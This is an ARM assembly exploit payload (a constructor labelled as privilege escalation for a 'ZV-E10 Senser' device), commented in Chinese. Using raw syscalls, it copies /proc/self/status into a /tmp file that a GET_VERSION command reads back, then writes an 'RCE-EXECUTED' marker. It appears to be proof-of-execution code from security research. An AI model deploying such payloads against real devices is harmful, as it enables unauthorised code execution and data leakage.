/* ZV-E10 Senser 提权载荷 ctor v3
 * 行为:
 *   1. read /proc/self/status (<=1024B)
 *   2. write 到 /tmp/jiritsu/ver.txt  <- GET_VERSION(0x400d) 会真实读回此文件
 *   3. 写标记 /tmp/jiritsu/RCE_MARK.txt ("RCE-EXECUTED")
 * 全部 ARM EABI 裸 syscall; 任一步失败都不崩溃 (负 fd/长度容错)
 */
    .syntax unified
    .arm
    .global jit_ctor
    .type jit_ctor, %function
jit_ctor:
    push    {r4-r7, lr}

    /* 1. open("/proc/self/status", O_RDONLY) */
    mov     r7, #5
    adr     r0, path_status
    movs    r1, #0
    movs    r2, #0
    svc     #0
    mov     r4, r0              /* r4 = fd */
    cmp     r4, #0
    blt     do_mark             /* open 失败 -> 直接去写标记 */

    /* 2. read(fd, sp, 1024) */
    mov     r7, #3
    mov     r0, r4
    mov     r1, sp
    movw    r2, #1024
    svc     #0
    mov     r5, r0              /* r5 = n */
    cmp     r5, #0
    ble     close_status

    /* 3. open("/tmp/jiritsu/ver.txt", O_WRONLY|O_CREAT|O_TRUNC, 0644) */
    mov     r7, #5
    adr     r0, path_ver
    mov     r1, #0x200
    add     r1, r1, #0x41       /* 0x241 */
    mov     r2, #0x1A0
    add     r2, r2, #4          /* 0x1A4 */
    svc     #0
    mov     r6, r0
    cmp     r6, #0
    blt     close_status

    /* 4. write(fd, sp, n) */
    mov     r7, #4
    mov     r0, r6
    mov     r1, sp
    mov     r2, r5
    svc     #0

    /* 5. close(ver fd) */
    mov     r7, #6
    mov     r0, r6
    svc     #0

close_status:
    /* 6. close(status fd) */
    mov     r7, #6
    mov     r0, r4
    svc     #0

do_mark:
    /* 7. open("/tmp/jiritsu/RCE_MARK.txt", 0x241, 0644) */
    mov     r7, #5
    adr     r0, path_mark
    mov     r1, #0x200
    add     r1, r1, #0x41
    mov     r2, #0x1A0
    add     r2, r2, #4
    svc     #0
    mov     r6, r0
    cmp     r6, #0
    blt     done

    /* 8. write(fd, marker, 12) */
    mov     r7, #4
    mov     r0, r6
    adr     r1, marker
    movs    r2, #12
    svc     #0

    /* 9. close */
    mov     r7, #6
    mov     r0, r6
    svc     #0

done:
    pop     {r4-r7, pc}

path_status:
    .ascii "/proc/self/status\0"
path_ver:
    .ascii "/tmp/jiritsu/ver.txt\0"
path_mark:
    .ascii "/tmp/jiritsu/RCE_MARK.txt\0"
marker:
    .ascii "RCE-EXECUTED"
    .align 2
